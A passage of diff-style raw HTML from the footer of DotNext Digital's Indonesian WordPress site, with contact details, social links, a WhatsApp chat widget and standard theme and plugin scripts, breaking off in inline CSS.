+<p style="text-align: justify;">E-mail   : <span style="color: #ffffff;"><a href="/cdn-cgi/l/email-protection#2c45424a436c4843584249545848454b45584d40024f4341" style="color: #ffffff;"><span class="__cf_email__" data-cfemail="9ff6f1f9f0dffbf0ebf1fae7ebfbf6f8f6ebfef3b1fcf0f2">[email&#160;protected]</span></a></span></p>
+<p style="text-align: justify;">Address:</p>
+<p style="text-align: justify;">Cohive 101 Building. Jl Mega Kuningan Barat Blok E4-7 No 1 9th Floor unit 28 &#8211; 30.Setiabudi, Jakarta 12950</p>
+<p style="text-align: justify;"></div>
+			</div>
+			</div><div class="et_pb_column et_pb_column_1_4 et_pb_column_21  et_pb_css_mix_blend_mode_passthrough">
+				
+				
+				
+				
+				<div class="et_pb_module et_pb_text et_pb_text_13  et_pb_text_align_left et_pb_bg_layout_light">
+				
+				
+				
+				
+				<div class="et_pb_text_inner"><p>Follow Us</p></div>
+			</div><div class="et_pb_module et_pb_divider et_pb_divider_1 et_pb_divider_position_ et_pb_space"><div class="et_pb_divider_internal"></div></div><ul class="et_pb_module et_pb_social_media_follow et_pb_social_media_follow_0 clearfix  et_pb_bg_layout_light">
+				
+				
+				
+				
+				<li
+            class='et_pb_social_media_follow_network_0 et_pb_social_icon et_pb_social_network_link  et-social-facebook'><a
+              href='https://www.facebook.com/dotnextdigital/'
+              class='icon et_pb_with_border'
+              title='Ikuti di Facebook'
+               target="_blank"><span
+                class='et_pb_social_media_follow_network_name'
+                aria-hidden='true'
+                >Ikuti</span></a></li><li
+            class='et_pb_social_media_follow_network_1 et_pb_social_icon et_pb_social_network_link  et-social-instagram'><a
+              href='https://www.instagram.com/dotnextdigital/'
+              class='icon et_pb_with_border'
+              title='Ikuti di Instagram'
+               target="_blank"><span
+                class='et_pb_social_media_follow_network_name'
+                aria-hidden='true'
+                >Ikuti</span></a></li><li
+            class='et_pb_social_media_follow_network_2 et_pb_social_icon et_pb_social_network_link  et-social-youtube'><a
+              href='https://www.youtube.com/channel/UCYrgL5kvLktQayCZBuekHFA'
+              class='icon et_pb_with_border'
+              title='Ikuti di Youtube'
+               target="_blank"><span
+                class='et_pb_social_media_follow_network_name'
+                aria-hidden='true'
+                >Ikuti</span></a></li>
+			</ul>
+			</div><div class="et_pb_column et_pb_column_1_4 et_pb_column_22  et_pb_css_mix_blend_mode_passthrough et-last-child">
+				
+				
+				
+				
+				<div class="et_pb_module et_pb_text et_pb_text_14  et_pb_text_align_left et_pb_bg_layout_light">
+				
+				
+				
+				
+				<div class="et_pb_text_inner"><p>Related Links</p></div>
+			</div><div class="et_pb_module et_pb_divider et_pb_divider_2 et_pb_divider_position_ et_pb_space"><div class="et_pb_divider_internal"></div></div><div class="et_pb_module et_pb_text et_pb_text_15  et_pb_text_align_left et_pb_bg_layout_light">
+				
+				
+				
+				
+				<div class="et_pb_text_inner"><ul>
+<li><span style="color: #ffffff;"><a href="https://dotnextdigital.com/blog/" style="color: #ffffff;">Blog</a></span></li>
+<li><a href="https://dotnextdigital.com/disclaimers/"><span style="color: #ffffff;">Disclaimer</span></a></li>
+<li><a href="https://dotnextdigital.com/privacy-policies/"><span style="color: #ffffff;">Privacy Policy</span></a></li>
+<li><span style="color: #ffffff;"><a href="https://dotnextdigital.com/sitemap_index.xml" style="color: #ffffff;">Sitemap</a></span></li>
+<li><a href="https://dotnextdigital.com/lowongan-kerja-dotnext-digital/"><span style="color: #ffffff;">Karir</span></a></li>
+</ul></div>
+			</div>
+			</div>
+				
+				
+				
+				
+			</div><div class="et_pb_row et_pb_row_12">
+				<div class="et_pb_column et_pb_column_4_4 et_pb_column_23  et_pb_css_mix_blend_mode_passthrough et-last-child">
+				
+				
+				
+				
+				<div class="et_pb_module et_pb_divider et_pb_divider_3 et_pb_divider_position_ et_pb_space"><div class="et_pb_divider_internal"></div></div>
+			</div>
+				
+				
+				
+				
+			</div>
+				
+				
+			</div>		</div>
+	</div>
+						</div>
+
+				
+				</article>
+
+			
+
+</div>
+
+
+			<footer id="main-footer">
+				
+
+		
+				<div id="footer-bottom">
+					<div class="container clearfix">
+				<ul class="et-social-icons">
+
+	<li class="et-social-icon et-social-facebook">
+		<a href="#" class="icon">
+			<span>Facebook</span>
+		</a>
+	</li>
+	<li class="et-social-icon et-social-twitter">
+		<a href="#" class="icon">
+			<span>X</span>
+		</a>
+	</li>
+	<li class="et-social-icon et-social-instagram">
+		<a href="#" class="icon">
+			<span>Instagram</span>
+		</a>
+	</li>
+	<li class="et-social-icon et-social-rss">
+		<a href="https://dotnextdigital.com/feed/" class="icon">
+			<span>RSS</span>
+		</a>
+	</li>
+
+</ul><div id="footer-info">Designed by <a href="https://dotnextdigital.com/" target="_blank"><strong>DOTNEXT</strong></a> | Copyright 2019 | <a href="https://dotnextdigital.com/privacy-policy-id/" target="_blank"><strong>Privacy Policy ID</strong></a> |  <a href="https://dotnextdigital.com/en/privacy-policy-terms-conditions/" target="_blank"><strong>Privacy Policy International</strong></a>
+</div>					</div>
+				</div>
+			</footer>
+		</div>
+
+
+	</div>
+	<!-- Click to Chat - https://holithemes.com/plugins/click-to-chat/  v4.12 -->  
+            <div class="ht-ctc ht-ctc-chat ctc-analytics ctc_wp_desktop style-2  " id="ht-ctc-chat"  
+                style="display: none;  position: fixed; bottom: 15px; right: 15px;"   >
+                                <div class="ht_ctc_style ht_ctc_chat_style">
+                <div  style="display: flex; justify-content: center; align-items: center;  " class="ctc-analytics ctc_s_2">
+    <p class="ctc-analytics ctc_cta ctc_cta_stick ht-ctc-cta  ht-ctc-cta-hover " style="padding: 0px 16px; line-height: 1.6; font-size: 15px; background-color: #25D366; color: #ffffff; border-radius:10px; margin:0 10px;  display: none; order: 0; ">Hubungi Kami</p>
+    <svg style="pointer-events:none; display:block; height:50px; width:50px;" width="50px" height="50px" viewBox="0 0 1024 1024">
+        <defs>
+        <path id="htwasqicona-chat" d="M1023.941 765.153c0 5.606-.171 17.766-.508 27.159-.824 22.982-2.646 52.639-5.401 66.151-4.141 20.306-10.392 39.472-18.542 55.425-9.643 18.871-21.943 35.775-36.559 50.364-14.584 14.56-31.472 26.812-50.315 36.416-16.036 8.172-35.322 14.426-55.744 18.549-13.378 2.701-42.812 4.488-65.648 5.3-9.402.336-21.564.505-27.15.505l-504.226-.081c-5.607 0-17.765-.172-27.158-.509-22.983-.824-52.639-2.646-66.152-5.4-20.306-4.142-39.473-10.392-55.425-18.542-18.872-9.644-35.775-21.944-50.364-36.56-14.56-14.584-26.812-31.471-36.415-50.314-8.174-16.037-14.428-35.323-18.551-55.744-2.7-13.378-4.487-42.812-5.3-65.649-.334-9.401-.503-21.563-.503-27.148l.08-504.228c0-5.607.171-17.766.508-27.159.825-22.983 2.646-52.639 5.401-66.151 4.141-20.306 10.391-39.473 18.542-55.426C34.154 93.24 46.455 76.336 61.07 61.747c14.584-14.559 31.472-26.812 50.315-36.416 16.037-8.172 35.324-14.426 55.745-18.549 13.377-2.701 42.812-4.488 65.648-5.3 9.402-.335 21.565-.504 27.149-.504l504.227.081c5.608 0 17.766.171 27.159.508 22.983.825 52.638 2.646 66.152 5.401 20.305 4.141 39.472 10.391 55.425 18.542 18.871 9.643 35.774 21.944 50.363 36.559 14.559 14.584 26.812 31.471 36.415 50.315 8.174 16.037 14.428 35.323 18.551 55.744 2.7 13.378 4.486 42.812 5.3 65.649.335 9.402.504 21.564.504 27.15l-.082 504.226z"/>
+        </defs>
+        <linearGradient id="htwasqiconb-chat" gradientUnits="userSpaceOnUse" x1="512.001" y1=".978" x2="512.001" y2="1025.023">
+            <stop offset="0" stop-color="#61fd7d"/>
+            <stop offset="1" stop-color="#2bb826"/>
+        </linearGradient>
+        <use xlink:href="#htwasqicona-chat" overflow="visible" style="fill: url(#htwasqiconb-chat)" fill="url(#htwasqiconb-chat)"/>
+        <g>
+            <path style="fill: #FFFFFF;" fill="#FFF" d="M783.302 243.246c-69.329-69.387-161.529-107.619-259.763-107.658-202.402 0-367.133 164.668-367.214 367.072-.026 64.699 16.883 127.854 49.017 183.522l-52.096 190.229 194.665-51.047c53.636 29.244 114.022 44.656 175.482 44.682h.151c202.382 0 367.128-164.688 367.21-367.094.039-98.087-38.121-190.319-107.452-259.706zM523.544 808.047h-.125c-54.767-.021-108.483-14.729-155.344-42.529l-11.146-6.612-115.517 30.293 30.834-112.592-7.259-11.544c-30.552-48.579-46.688-104.729-46.664-162.379.066-168.229 136.985-305.096 305.339-305.096 81.521.031 158.154 31.811 215.779 89.482s89.342 134.332 89.312 215.859c-.066 168.243-136.984 305.118-305.209 305.118zm167.415-228.515c-9.177-4.591-54.286-26.782-62.697-29.843-8.41-3.062-14.526-4.592-20.645 4.592-6.115 9.182-23.699 29.843-29.053 35.964-5.352 6.122-10.704 6.888-19.879 2.296-9.176-4.591-38.74-14.277-73.786-45.526-27.275-24.319-45.691-54.359-51.043-63.543-5.352-9.183-.569-14.146 4.024-18.72 4.127-4.109 9.175-10.713 13.763-16.069 4.587-5.355 6.117-9.183 9.175-15.304 3.059-6.122 1.529-11.479-.765-16.07-2.293-4.591-20.644-49.739-28.29-68.104-7.447-17.886-15.013-15.466-20.645-15.747-5.346-.266-11.469-.322-17.585-.322s-16.057 2.295-24.467 11.478-32.113 31.374-32.113 76.521c0 45.147 32.877 88.764 37.465 94.885 4.588 6.122 64.699 98.771 156.741 138.502 21.892 9.45 38.982 15.094 52.308 19.322 21.98 6.979 41.982 5.995 57.793 3.634 17.628-2.633 54.284-22.189 61.932-43.615 7.646-21.427 7.646-39.791 5.352-43.617-2.294-3.826-8.41-6.122-17.585-10.714z"/>
+        </g>
+        </svg></div>                </div>
+            </div>
+                        <span class="ht_ctc_chat_data" 
+                data-no_number=""
+                data-settings="{&quot;number&quot;:&quot;6287777055000&quot;,&quot;pre_filled&quot;:&quot;&quot;,&quot;dis_m&quot;:&quot;show&quot;,&quot;dis_d&quot;:&quot;show&quot;,&quot;css&quot;:&quot;display: none; cursor: pointer; z-index: 99999999;&quot;,&quot;pos_d&quot;:&quot;position: fixed; bottom: 15px; right: 15px;&quot;,&quot;pos_m&quot;:&quot;position: fixed; bottom: 15px; right: 15px;&quot;,&quot;schedule&quot;:&quot;no&quot;,&quot;se&quot;:150,&quot;ani&quot;:&quot;no-animations&quot;,&quot;url_structure_d&quot;:&quot;web&quot;,&quot;url_target_d&quot;:&quot;_blank&quot;,&quot;ga&quot;:&quot;yes&quot;,&quot;fb&quot;:&quot;yes&quot;,&quot;g_init&quot;:&quot;default&quot;,&quot;g_an_event_name&quot;:&quot;chat: {number}&quot;,&quot;pixel_event_name&quot;:&quot;Click to Chat by HoliThemes&quot;}" 
+            ></span>
+            	<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script type="text/javascript">
+				var et_animation_data = [{"class":"et_pb_row_1","style":"flip","repeat":"once","duration":"1300ms","delay":"0ms","intensity":"50%","starting_opacity":"0%","speed_curve":"ease-in-out"},{"class":"et_pb_row_3","style":"slideRight","repeat":"once","duration":"1150ms","delay":"0ms","intensity":"50%","starting_opacity":"0%","speed_curve":"ease-in-out"},{"class":"et_pb_row_4","style":"slideLeft","repeat":"once","duration":"1150ms","delay":"0ms","intensity":"50%","starting_opacity":"0%","speed_curve":"ease-in-out"}];
+				</script>
+	<script type="rocketlazyloadscript" data-rocket-type="text/javascript">window.addEventListener('DOMContentLoaded', function() {
+(function($) { 
+    function setup_collapsible_submenus() {
+        // mobile menu
+        $('#mobile_menu .menu-item-has-children > a').after('<span class="menu-closed"></span>');
+        $('#mobile_menu .menu-item-has-children > a').each(function() {
+            $(this).next().next('.sub-menu').toggleClass('hide',1000);
+        });
+        $('#mobile_menu .menu-item-has-children > a + span').on('click', function(event) {
+            event.preventDefault();
+            $(this).toggleClass('menu-open');
+            $(this).next('.sub-menu').toggleClass('hide',1000);
+        });
+    }
+      
+    $(window).load(function() {
+        setTimeout(function() {
+            setup_collapsible_submenus();
+        }, 700);
+    });
+ 
+})(jQuery);
+});</script><link rel='stylesheet' id='mediaelement-css' href='https://dotnextdigital.com/wp-content/cache/background-css/dotnextdigital.com/wp-includes/js/mediaelement/mediaelementplayer-legacy.min.css?ver=4.2.17&wpr_t=1732817520' type='text/css' media='all' />
+<link data-minify="1" rel='stylesheet' id='wp-mediaelement-css' href='https://dotnextdigital.com/wp-content/cache/min/1/wp-includes/js/mediaelement/wp-mediaelement.css?ver=1732600825' type='text/css' media='all' />
+<link data-minify="1" rel='stylesheet' id='wp-block-library-css' href='https://dotnextdigital.com/wp-content/cache/min/1/wp-includes/css/dist/block-library/style.css?ver=1732600825' type='text/css' media='none' onload="media='all'" />
+<style id='core-block-supports-inline-css' type='text/css'>
+/**
+ * Core styles: block-supports
+ */
+
+</style>
+<script type="text/javascript" id="ht_ctc_app_js-js-extra">
+/* <![CDATA[ */
+var ht_ctc_chat_var = {"number":"6287777055000","pre_filled":"","dis_m":"show","dis_d":"show","css":"display: none; cursor: pointer; z-index: 99999999;","pos_d":"position: fixed; bottom: 15px; right: 15px;","pos_m":"position: fixed; bottom: 15px; right: 15px;","schedule":"no","se":"150","ani":"no-animations","url_structure_d":"web","url_target_d":"_blank","ga":"yes","fb":"yes","g_init":"default","g_an_event_name":"chat: {number}","pixel_event_name":"Click to Chat by HoliThemes"};
+var ht_ctc_variables = {"g_an_event_name":"chat: {number}","pixel_event_type":"trackCustom","pixel_event_name":"Click to Chat by HoliThemes","g_an_params":["g_an_param_1","g_an_param_2","g_an_param_3"],"g_an_param_1":{"key":"number","value":"{number}"},"g_an_param_2":{"key":"title","value":"{title}"},"g_an_param_3":{"key":"url","value":"{url}"},"pixel_params":["pixel_param_1","pixel_param_2","pixel_param_3","pixel_param_4"],"pixel_param_1":{"key":"Category","value":"Click to Chat for WhatsApp"},"pixel_param_2":{"key":"ID","value":"{number}"},"pixel_param_3":{"key":"Title","value":"{title}"},"pixel_param_4":{"key":"URL","value":"{url}"}};
+/* ]]> */
+</script>
+<script type="rocketlazyloadscript" data-minify="1" data-rocket-type="text/javascript" data-rocket-src="https://dotnextdigital.com/wp-content/cache/min/1/wp-content/plugins/click-to-chat-for-whatsapp/new/inc/assets/js/app.js?ver=1732600825" id="ht_ctc_app_js-js" defer></script>
+<script type="text/javascript" id="rocket_lazyload_css-js-extra">
+/* <![CDATA[ */
+var rocket_lazyload_css_data = {"threshold":"300"};
+/* ]]> */
+</script>
+<script type="text/javascript" id="rocket_lazyload_css-js-after">
+/* <![CDATA[ */
+!function o(n,c,a){function s(t,e){if(!c[t]){if(!n[t]){var r="function"==typeof require&&require;if(!e&&r)return r(t,!0);if(u)return u(t,!0);throw(r=new Error("Cannot find module '"+t+"'")).code="MODULE_NOT_FOUND",r}r=c[t]={exports:{}},n[t][0].call(r.exports,function(e){return s(n[t][1][e]||e)},r,r.exports,o,n,c,a)}return c[t].exports}for(var u="function"==typeof require&&require,e=0;e<a.length;e++)s(a[e]);return s}({1:[function(e,t,r){"use strict";!function(){const r="undefined"==typeof rocket_pairs?[]:rocket_pairs,e="undefined"==typeof rocket_excluded_pairs?[]:rocket_excluded_pairs;e.map(t=>{var e=t.selector;const r=document.querySelectorAll(e);r.forEach(e=>{e.setAttribute("data-rocket-lazy-bg-".concat(t.hash),"excluded")})});const o=document.querySelector("#wpr-lazyload-bg-container");var t=rocket_lazyload_css_data.threshold||300;const n=new IntersectionObserver(e=>{e.forEach(t=>{if(t.isIntersecting){const e=r.filter(e=>t.target.matches(e.selector));e.map(t=>{var e;t&&((e=document.createElement("style")).textContent=t.style,o.insertAdjacentElement("afterend",e),t.elements.forEach(e=>{n.unobserve(e),e.setAttribute("data-rocket-lazy-bg-".concat(t.hash),"loaded")}))})}})},{rootMargin:t+"px"});function c(){0<(0<arguments.length&&void 0!==arguments[0]?arguments[0]:[]).length&&r.forEach(t=>{try{const e=document.querySelectorAll(t.selector);e.forEach(e=>{"loaded"!==e.getAttribute("data-rocket-lazy-bg-".concat(t.hash))&&"excluded"!==e.getAttribute("data-rocket-lazy-bg-".concat(t.hash))&&(n.observe(e),(t.elements||(t.elements=[])).push(e))})}catch(e){console.error(e)}})}c();const a=function(){const o=window.MutationObserver;return function(e,t){if(e&&1===e.nodeType){const r=new o(t);return r.observe(e,{attributes:!0,childList:!0,subtree:!0}),r}}}();t=document.querySelector("body"),a(t,c)}()},{}]},{},[1]);
+//# sourceMappingURL=lazyload-css.min.js.map
+/* ]]> */
+</script>
+<script type="text/javascript" id="divi-custom-script-js-extra">
+/* <![CDATA[ */
+var DIVI = {"item_count":"%d Item","items_count":"%d Items"};
+var et_builder_utils_params = {"condition":{"diviTheme":true,"extraTheme":false},"scrollLocations":["app","top"],"builderScrollLocations":{"desktop":"app","tablet":"app","phone":"app"},"onloadScrollLocation":"app","builderType":"fe"};
+var et_frontend_scripts = {"builderCssContainerPrefix":"#et-boc","builderCssLayoutPrefix":"#et-boc .et-l"};
+var et_pb_custom = {"ajaxurl":"https:\/\/dotnextdigital.com\/wp-admin\/admin-ajax.php","images_uri":"https:\/\/dotnextdigital.com\/wp-content\/themes\/Divi\/images","builder_images_uri":"https:\/\/dotnextdigital.com\/wp-content\/themes\/Divi\/includes\/builder\/images","et_frontend_nonce":"18dd25ba69","subscription_failed":"Silakan, periksa ladang di bawah ini untuk memastikan anda memasukkan informasi yang benar.","et_ab_log_nonce":"ed139ccc4a","fill_message":"Silahkan, isi kolom berikut:","contact_error_message":"Perbaiki kesalahan-kesalahan berikut:","invalid":"Tidak valid email","captcha":"Captcha","prev":"Sebelum","previous":"Sebelumnya","next":"Berikutnya","wrong_captcha":"Anda memasukkan angka yang salah pada captcha.","wrong_checkbox":"kotak centang","ignore_waypoints":"no","is_divi_theme_used":"1","widget_search_selector":".widget_search","ab_tests":[],"is_ab_testing_active":"","page_id":"12","unique_test_id":"","ab_bounce_rate":"5","is_cache_plugin_active":"yes","is_shortcode_tracking":"","tinymce_uri":"https:\/\/dotnextdigital.com\/wp-content\/themes\/Divi\/includes\/builder\/frontend-builder\/assets\/vendors","accent_color":"#2ea3f2","waypoints_options":[]};
+var et_pb_box_shadow_elements = [];
+/* ]]> */
+</script>
+<script type="rocketlazyloadscript" data-rocket-type="text/javascript" data-rocket-src="https://dotnextdigital.com/wp-content/themes/Divi/js/scripts.min.js?ver=4.27.1" id="divi-custom-script-js" defer></script>
+<script type="rocketlazyloadscript" data-minify="1" data-rocket-type="text/javascript" data-rocket-src="https://dotnextdigital.com/wp-content/cache/min/1/npm/chart.js?ver=1732600826" id="chart-js-js" defer></script>
+<script type="rocketlazyloadscript" data-rocket-type="text/javascript" data-rocket-src="https://dotnextdigital.com/wp-content/themes/Divi/core/admin/js/es6-promise.auto.min.js?ver=4.27.1" id="es6-promise-js" defer></script>
+<script type="rocketlazyloadscript" data-rocket-type="text/javascript" data-rocket-src="https://www.google.com/recaptcha/api.js?render=6Lcj72IcAAAAAPrc3KKzmAE3KvcJ80rXs_ME4BVW&amp;ver=4.27.1" id="et-recaptcha-v3-js"></script>
+<script type="text/javascript" id="et-core-api-spam-recaptcha-js-extra">
+/* <![CDATA[ */
+var et_core_api_spam_recaptcha = {"site_key":"6Lcj72IcAAAAAPrc3KKzmAE3KvcJ80rXs_ME4BVW","page_action":{"action":"dotnextdigital_com"}};
+/* ]]> */
+</script>
+<script type="rocketlazyloadscript" data-minify="1" data-rocket-type="text/javascript" data-rocket-src="https://dotnextdigital.com/wp-content/cache/min/1/wp-content/themes/Divi/core/admin/js/recaptcha.js?ver=1732600826" id="et-core-api-spam-recaptcha-js" defer></script>
+<script type="rocketlazyloadscript" data-minify="1" data-rocket-type="text/javascript" data-rocket-src="https://dotnextdigital.com/wp-content/cache/min/1/wp-content/themes/Divi/core/admin/js/common.js?ver=1732600826" id="et-core-common-js" defer></script>
+<script type="rocketlazyloadscript" data-minify="1" data-rocket-type="text/javascript" data-rocket-src="https://dotnextdigital.com/wp-content/cache/min/1/wp-includes/js/hoverIntent.js?ver=1732600826" id="hoverIntent-js" defer></script>
+<script type="rocketlazyloadscript" data-minify="1" data-rocket-type="text/javascript" data-rocket-src="https://dotnextdigital.com/wp-content/cache/min/1/wp-content/plugins/megamenu/js/maxmegamenu.js?ver=1732600826" id="megamenu-js" defer></script>
+<script type="rocketlazyloadscript" data-rocket-type="text/javascript" data-rocket-src="https://dotnextdigital.com/wp-content/plugins/wp-carousel-free/public/js/preloader.min.js?ver=2.7.2" id="wpcp-preloader-js" defer></script>
+<script type="rocketlazyloadscript" data-rocket-type="text/javascript" data-rocket-src="https://dotnextdigital.com/wp-content/plugins/wp-carousel-free/public/js/swiper-bundle.min.js?ver=2.7.2" id="wpcf-swiper-js-js" defer></script>
+<script type="rocketlazyloadscript" data-rocket-type="text/javascript" data-rocket-src="https://dotnextdigital.com/wp-content/plugins/wp-carousel-free/public/js/wp-carousel-free-public.min.js?ver=2.7.2" id="wpcf-swiper-config-js" defer></script>
+<script type="rocketlazyloadscript" data-rocket-type="text/javascript" id="mediaelement-core-js-before">
+/* <![CDATA[ */
+var mejsL10n = {"language":"id","strings":{"mejs.download-file":"Unduh Berkas","mejs.install-flash":"Anda menggunakan peramban yang tidak terinstal pemutar Flash. Silakan hidupkan plugin pemutar Flash Anda atau unduh versi terakhirnya dari https:\/\/get.adobe.com\/flashplayer\/","mejs.fullscreen":"Selayar penuh","mejs.play":"Putar","mejs.pause":"Jeda","mejs.time-slider":"Penggeser Waktu","mejs.time-help-text":"Gunakan tuts Panah Kanan\/Kiri untuk melompat satu detik, panah Atas\/Bawah untuk melompat sepuluh detik.","mejs.live-broadcast":"Siaran Langsung","mejs.volume-help-text":"Gunakan Anak Panah Atas\/Bawah untuk menaikkan atau menurunkan volume.","mejs.unmute":"Matikan Sunyi","mejs.mute":"Bisu","mejs.volume-slider":"Penggeser Volume","mejs.video-player":"Pemutar Video","mejs.audio-player":"Pemutar Audio","mejs.captions-subtitles":"Subteks\/Subjudul","mejs.captions-chapters":"Bab","mejs.none":"Tak ada","mejs.afrikaans":"Bahasa Afrikanas","mejs.albanian":"Bahasa Albania","mejs.arabic":"Bahasa Arab","mejs.belarusian":"Bahasa Belarusia","mejs.bulgarian":"Bahasa Bulgaria","mejs.catalan":"Bahasa Katalan","mejs.chinese":"Bahasa Mandarin","mejs.chinese-simplified":"Bahasa Mandarin (Disederhanakan)","mejs.chinese-traditional":"Bahasa Mandarin (Tradisional)","mejs.croatian":"Bahasa Kroasia","mejs.czech":"Bahasa Ceko","mejs.danish":"Bahasa Denmark","mejs.dutch":"Bahasa Belanda","mejs.english":"Bahasa Inggris","mejs.estonian":"Bahasa Estonia","mejs.filipino":"Bahasa Filipino","mejs.finnish":"Bahasa Finlandia","mejs.french":"Bahasa Perancis","mejs.galician":"Bahasa Galikan","mejs.german":"Bahasa Jerman","mejs.greek":"Bahasa Yunani","mejs.haitian-creole":"Bahasa Kreol Haiti","mejs.hebrew":"Bahasa Ibrani","mejs.hindi":"Bahasa Hindi","mejs.hungarian":"Bahasa Hungaria","mejs.icelandic":"Bahasa Islandia","mejs.indonesian":"Bahasa Indonesia","mejs.irish":"Bahasa Irlandia","mejs.italian":"Bahasa Italia","mejs.japanese":"Bahasa Jepang","mejs.korean":"Bahasa Korea","mejs.latvian":"Bahasa Latvia","mejs.lithuanian":"Bahasa Lithuania","mejs.macedonian":"Bahasa Macedonia","mejs.malay":"Bahasa Melayu","mejs.maltese":"Bahasa Malta","mejs.norwegian":"Bahasa Norwegia","mejs.persian":"Bahasa Persia","mejs.polish":"Bahasa Polandia","mejs.portuguese":"Bahasa Portugis","mejs.romanian":"Bahasa Romania","mejs.russian":"Bahasa Russia","mejs.serbian":"Bahasa Serbia","mejs.slovak":"Bahasa Slovakia","mejs.slovenian":"Bahasa Slovenia","mejs.spanish":"Bahasa Spanyol","mejs.swahili":"Bahasa Swahili","mejs.swedish":"Bahasa Swedia","mejs.tagalog":"Bahasa Tagalog","mejs.thai":"Bahasa Thai","mejs.turkish":"Bahasa Turki","mejs.ukrainian":"Bahasa Ukraina","mejs.vietnamese":"Bahasa Vietnam","mejs.welsh":"Bahasa Welsh","mejs.yiddish":"Bahasa Yiddi"}};
+/* ]]> */
+</script>
+<script type="rocketlazyloadscript" data-minify="1" data-rocket-type="text/javascript" data-rocket-src="https://dotnextdigital.com/wp-content/cache/min/1/wp-includes/js/mediaelement/mediaelement-and-player.js?ver=1732600826" id="mediaelement-core-js" defer></script>
+<script type="rocketlazyloadscript" data-minify="1" data-rocket-type="text/javascript" data-rocket-src="https://dotnextdigital.com/wp-content/cache/min/1/wp-includes/js/mediaelement/mediaelement-migrate.js?ver=1732600826" id="mediaelement-migrate-js" defer></script>
+<script type="text/javascript" id="mediaelement-js-extra">
+/* <![CDATA[ */
+var _wpmejsSettings = {"pluginPath":"\/wp-includes\/js\/mediaelement\/","classPrefix":"mejs-","stretching":"responsive","audioShortcodeLibrary":"mediaelement","videoShortcodeLibrary":"mediaelement"};
+/* ]]> */
+</script>
+<script type="rocketlazyloadscript" data-minify="1" data-rocket-type="text/javascript" data-rocket-src="https://dotnextdigital.com/wp-content/cache/min/1/wp-includes/js/mediaelement/wp-mediaelement.js?ver=1732600826" id="wp-mediaelement-js" defer></script>
+<script type="rocketlazyloadscript" data-minify="1" data-rocket-type="text/javascript" data-rocket-src="https://dotnextdigital.com/wp-content/cache/min/1/wp-content/themes/Divi/includes/builder/feature/dynamic-assets/assets/js/salvattore.js?ver=1732600827" id="salvattore-js" defer></script>
+<script type="rocketlazyloadscript" data-minify="1" data-rocket-type="text/javascript" data-rocket-src="https://dotnextdigital.com/wp-content/cache/min/1/wp-content/themes/Divi/includes/builder/feature/dynamic-assets/assets/js/jquery.fitvids.js?ver=1732600827" id="fitvids-js" defer></script>
+<script type="rocketlazyloadscript" data-minify="1" data-rocket-type="text/javascript" data-rocket-src="https://dotnextdigital.com/wp-content/cache/min/1/wp-content/themes/Divi/includes/builder/feature/dynamic-assets/assets/js/jquery.mobile.js?ver=1732600827" id="jquery-mobile-js" defer></script>
+<script type="rocketlazyloadscript" data-minify="1" data-rocket-type="text/javascript" data-rocket-src="https://dotnextdigital.com/wp-content/cache/min/1/wp-content/themes/Divi/includes/builder/feature/dynamic-assets/assets/js/easypiechart.js?ver=1732600827" id="easypiechart-js" defer></script>
+<script type="rocketlazyloadscript" data-rocket-type="text/javascript">
+(function() {
+				var expirationDate = new Date();
+				expirationDate.setTime( expirationDate.getTime() + 31536000 * 1000 );
+				document.cookie = "pll_language=id; expires=" + expirationDate.toUTCString() + "; path=/; secure; SameSite=Lax";
+			}());
+
+</script>
+<style id="et-builder-module-design-deferred-12-cached-inline-styles">.et_pb_slider .et_pb_slide_0 .et_pb_slide_description .et_pb_button_wrapper{text-align:left}body #page-container .et_pb_section .et_pb_slider .et_pb_slide_0.et_pb_slide .et_pb_more_button.et_pb_button:hover:after{opacity:1}body #page-container .et_pb_section .et_pb_slider .et_pb_slide_0.et_pb_slide .et_pb_more_button.et_pb_button:after{font-size:1.6em;opacity:0}body.et_button_custom_icon #page-container .et_pb_slider .et_pb_slide_0.et_pb_slide .et_pb_more_button.et_pb_button:after{font-size:19px}.et_pb_slide_0,.et_pb_slide_1{background-color:rgba(0,0,0,0.1)}.et_pb_fullwidth_slider_0.et_pb_slider .et_pb_slide_description .et_pb_slide_title{font-family:'Abel',Helvetica,Arial,Lucida,sans-serif}.et_pb_section_1.et_pb_section{padding-top:3px;padding-bottom:3px;margin-top:19px}.et_pb_row_0.et_pb_row{padding-top:20px!important;padding-bottom:20px!important;margin-top:12px!important;margin-right:auto!important;margin-left:auto!important;padding-top:20px;padding-bottom:20px}.et_pb_text_0 h1{font-family:'Allerta Stencil',Helvetica,Arial,Lucida,sans-serif}.et_pb_text_0 h3,.et_pb_text_1 h3,.et_pb_text_2 h3,.et_pb_text_3 h3,.et_pb_text_6 h3,.et_pb_text_7 h3,.et_pb_text_8 h3{font-family:'Allerta Stencil',Helvetica,Arial,Lucida,sans-serif;font-weight:700;font-size:23px;color:#000000!important}.et_pb_text_0,.et_pb_text_2,.et_pb_text_6{margin-bottom:-1px!important}.et_pb_text_1.et_pb_text,.et_pb_text_3.et_pb_text,.et_pb_text_7.et_pb_text,.et_pb_accordion_item_0.et_pb_toggle .et_pb_toggle_content:hover,.et_pb_accordion_item_1.et_pb_toggle .et_pb_toggle_content:hover,.et_pb_accordion_item_2.et_pb_toggle .et_pb_toggle_content:hover,.et_pb_accordion_item_3.et_pb_toggle .et_pb_toggle_content:hover,.et_pb_accordion_item_4.et_pb_toggle .et_pb_toggle_content:hover,.et_pb_accordion_item_5.et_pb_toggle .et_pb_toggle_content:hover,.et_pb_accordion_item_6.et_pb_toggle .et_pb_toggle_content:hover,.et_pb_accordion_item_7.et_pb_toggle .et_pb_toggle_content:hover{color:#000000!important}.et_pb_text_1{font-family:'Allerta Stencil',Helvetica,Arial,Lucida,sans-serif;font-size:15px}.et_pb_row_1.et_pb_row{padding-top:30px!important;padding-bottom:30px!important;margin-top:0px!important;margin-bottom:0px!important;padding-top:30px;padding-bottom:30px}.et_pb_row_1,body #page-container .et-db #et-boc .et-l .et_pb_row_1.et_pb_row,body.et_pb_pagebuilder_layout.single #page-container #et-boc .et-l .et_pb_row_1.et_pb_row,body.et_pb_pagebuilder_layout.single.et_full_width_page #page-container #et-boc .et-l .et_pb_row_1.et_pb_row{width:100%;max-width:1286px}.et_pb_blurb_0.et_pb_blurb .et_pb_module_header,.et_pb_blurb_0.et_pb_blurb .et_pb_module_header a,.et_pb_blurb_1.et_pb_blurb .et_pb_module_header,.et_pb_blurb_1.et_pb_blurb .et_pb_module_header a,.et_pb_blurb_2.et_pb_blurb 